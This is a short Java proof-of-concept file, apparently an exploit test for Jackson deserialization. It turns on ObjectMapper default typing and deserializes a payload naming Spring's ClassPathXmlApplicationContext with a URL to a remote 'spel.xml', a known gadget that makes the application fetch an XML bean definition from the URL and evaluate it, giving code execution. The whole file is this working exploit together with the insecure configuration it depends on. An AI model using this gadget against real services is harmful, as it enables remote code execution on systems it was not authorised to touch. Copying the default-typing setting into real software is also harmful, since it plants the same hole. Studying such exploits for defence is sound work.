package com.test.jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class Springframework {

    public static void main(String[] args) {

        String payload = "[\"org.springframework.context.support.ClassPathXmlApplicationContext\", " +
                "\"http://127.0.0.1:80/spel.xml\"]\n";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            mapper.readValue(payload, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
